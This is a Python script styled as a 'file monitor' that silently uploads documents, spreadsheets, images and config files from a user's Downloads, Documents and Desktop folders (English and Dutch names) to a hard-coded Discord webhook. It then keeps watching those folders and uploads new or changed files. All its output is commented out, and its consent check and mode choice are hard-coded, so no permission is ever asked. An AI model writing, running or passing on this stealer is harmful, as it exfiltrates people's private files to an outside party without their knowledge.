import os
import json
import hashlib
import time
import threading
import requests
from pathlib import Path
from datetime import datetime
from time import ctime
import sys
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class FileMonitor:
    def __init__(self, webhook_url, state_file="file_monitor_state.json"):
        """
        Monitor files and send new ones to Discord webhook
        """
        self.webhook_url = webhook_url
        self.state_file = state_file
        self.sent_files = self.load_state()
        self.monitored_folders = []
        self.running = True
        
        # File extensions to monitor
        self.monitored_extensions = {
            # Documents
            '.txt', '.doc', '.docx', '.rtf', '.odt', '.pdf', '.md',
            # Excel/Spreadsheets
            '.xls', '.xlsx', '.csv', '.ods',
            # PowerPoint/Presentations
            '.ppt', '.pptx', '.odp',
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico', '.webp',
            # Other text files
            '.log', '.ini', '.cfg', '.conf', '.xml', '.json', '.yaml', '.yml'
        }
        
        # Max file size (25MB for Discord free tier)
        self.max_file_size = 25 * 1024 * 1024
        
    def get_user_folders(self):
        """Get English and Dutch user folders to monitor"""
        home = Path.home()
        folders = []
        
        # English folder names
        english_folders = {
            'Downloads': home / "Downloads",
            'Documents': home / "Documents",
            'Desktop': home / "Desktop"
        }
        
        # Dutch folder names
        dutch_folders = {
            'Downloads': home / "Downloads",  # Same in Dutch
            'Documenten': home / "Documenten",
            'Bureaublad': home / "Bureaublad"
        }
        
        # Add all folders that exist
        for name, path in english_folders.items():
            if path.exists() and path not in folders:
                folders.append(path)
                
        for name, path in dutch_folders.items():
            if path.exists() and path not in folders:
                folders.append(path)
        
        return folders
    
    def load_state(self):
        """Load previously sent files from state file"""
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    return json.load(f)
            except:
                #print("Error loading state file, starting fresh")
                return {}
        return {}
    
    def save_state(self):
        """Save sent files to state file"""
        try:
            with open(self.state_file, 'w') as f:
                json.dump(self.sent_files, f, indent=2)
        except Exception as e:
            pass
    
    def get_file_hash(self, file_path):
        """Generate a unique hash for a file based on path and modification time"""
        try:
            stat = os.stat(file_path)
            # Use path + size + modification time as unique identifier
            unique_string = f"{file_path}_{stat.st_size}_{stat.st_mtime}"
            return hashlib.md5(unique_string.encode()).hexdigest()
        except:
            return None
    
    def should_monitor_file(self, file_path):
        """Check if file should be monitored based on extension and size"""
        # Check extension
        ext = os.path.splitext(file_path)[1].lower()
        if ext not in self.monitored_extensions:
            return False
        
        # Check if file exists and is readable
        if not os.path.exists(file_path) or not os.access(file_path, os.R_OK):
            return False
        
        # Check file size
        try:
            size = os.path.getsize(file_path)
            if size > self.max_file_size:
                #print(f"File too large: {file_path} ({size} bytes)")
                return False
            if size == 0:
                return False  # Skip empty files
        except:
            return False
        
        return True
    
    def send_file_to_discord(self, file_path):
        """Send a file to Discord webhook"""
        try:
            file_hash = self.get_file_hash(file_path)
            if not file_hash:
                return False
            
            # Check if already sent
            if file_hash in self.sent_files:
                #print(f"Already sent: {file_path}")
                return False
            
            filename = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            CreationTime = ctime(os.path.getctime(file_path))
            LastModifiedTime = ctime(os.path.getmtime(file_path))


            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Determine file type for emoji
            ext = os.path.splitext(file_path)[1].lower()
            if ext in ['.txt', '.doc', '.docx', '.pdf', '.md', '.rtf', '.odt']:
                emoji = "📄"
            elif ext in ['.xls', '.xlsx', '.csv', '.ods']:
                emoji = "📊"
            elif ext in ['.ppt', '.pptx', '.odp']:
                emoji = "📽️"
            elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']:
                emoji = "🖼️"
            else:
                emoji = "📁"
            
            # Prepare message
            message = f"{emoji} **New File Detected**\n"
            message += f"**File:** `{filename}`\n"
            message += f"**Location:** `{file_path.parent}`\n"
            message += f"**Size:** {self.format_file_size(file_size)}\n"
            message += f"**Time:** {timestamp}\n"
            message += f"**Created:** {CreationTime}\n"
            message += f"**Modified:** {LastModifiedTime}\n"

            # Send file
            with open(file_path, 'rb') as f:
                files = {'file': (filename, f, self.get_mime_type(file_path))}
                data = {'content': message}
                
                response = requests.post(self.webhook_url, files=files, data=data)
                
                if response.status_code == 200:
                    # Mark as sent
                    self.sent_files[file_hash] = {
                        'path': str(file_path),
                        'filename': filename,
                        'size': file_size,
                        'sent_time': timestamp
                    }
                    self.save_state()
                    #print(f"Sent: {filename}")
                    return True
                else:
                    #print(f"Failed to send {filename}: {response.status_code}")
                    return False
                    
        except Exception as e:
            #print(f"Error sending {file_path}: {e}")
            return False
    
    def get_mime_type(self, file_path):
        """Get MIME type for file"""
        ext = os.path.splitext(file_path)[1].lower()
        mime_types = {
            '.txt': 'text/plain',
            '.pdf': 'application/pdf',
            '.doc': 'application/msword',
            '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            '.xls': 'application/vnd.ms-excel',
            '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            '.ppt': 'application/vnd.ms-powerpoint',
            '.pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.png': 'image/png',
            '.gif': 'image/gif',
            '.bmp': 'image/bmp',
            '.json': 'application/json',
            '.xml': 'application/xml',
            '.csv': 'text/csv'
        }
        return mime_types.get(ext, 'application/octet-stream')
    
    def format_file_size(self, size):
        """Format file size in human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} TB"
    
    def scan_existing_files(self):
        """Scan all monitored folders for existing files"""
        #print("Scanning for existing files...")
        total_found = 0
        total_sent = 0
        
        for folder in self.monitored_folders:
            #print(f"Scanning: {folder}")
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = Path(root) / file
                    
                    if self.should_monitor_file(file_path):
                        total_found += 1
                        if self.send_file_to_discord(file_path):
                            total_sent += 1
                        
                        # Small delay to avoid rate limiting
                        time.sleep(0.25)
        
        #print(f"Scan complete. Found: {total_found}, Sent: {total_sent}")
    
    class NewFileHandler(FileSystemEventHandler):
        """Handler for new file events"""
        def __init__(self, monitor):
            self.monitor = monitor
        
        def on_created(self, event):
            if not event.is_directory:
                time.sleep(1)  # Wait for file to be fully written
                if self.monitor.should_monitor_file(event.src_path):
                    self.monitor.send_file_to_discord(event.src_path)
        
        def on_modified(self, event):
            if not event.is_directory:
                time.sleep(1)  # Wait for file to be fully written
                if self.monitor.should_monitor_file(event.src_path):
                    self.monitor.send_file_to_discord(event.src_path)
    
    def start_monitoring(self):
        """Start monitoring folders for new files"""
        # Set up observers for each folder
        observers = []
        
        for folder in self.monitored_folders:
            if folder.exists():
                event_handler = self.NewFileHandler(self)
                observer = Observer()
                observer.schedule(event_handler, str(folder), recursive=True)
                observer.start()
                observers.append(observer)
                #print(f"Monitoring: {folder}")
        
        #print(f"Monitoring {len(observers)} folders for new files...")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        
        # Stop all observers
        for observer in observers:
            observer.stop()
        
        for observer in observers:
            observer.join()
    
    def start(self):
        """Start the file monitor"""
        #print("="*50)
        #print("FILE MONITOR - English/Dutch Support")
        #print("="*50)
        
        # Get folders to monitor
        self.monitored_folders = self.get_user_folders()

        if not self.monitored_folders:
            #print("No monitored folders found!")
            return

        choice = '3'
        
        if choice in ['1', '3']:
            #print("\nScanning existing files...")
            self.scan_existing_files()
        
        if choice in ['2', '3']:
            #print("\nStarting file monitor...")
            #print("Press Ctrl+C to stop")
            self.start_monitoring()

def main():
    # Configuration - REPLACE WITH YOUR WEBHOOK URL
    DISCORD_WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1476685281942966486/wUBLfjfrkAzVLbupPb4eEWPxswJLHse_Bwnqon_ps3ZeLlOtBlu9oq4k31PY0cqjwjLf"
    
    
    consent = 'yes'
    
    if consent == 'yes':
        monitor = FileMonitor(DISCORD_WEBHOOK_URL)
        
        try:
            monitor.start()
        except KeyboardInterrupt:
            #print("\nStopping...")
            pass
    else:
        #print("You must have permission to run this tool.")
        sys.exit(1)

if __name__ == "__main__":
    # Check for required modules
    try:
        import requests
        from watchdog.observers import Observer
        from watchdog.events import FileSystemEventHandler
    except ImportError as e:
        #print(f"Missing required module: {e}")
        #print("Install with: pip install requests watchdog")
        sys.exit(1)
    
    main()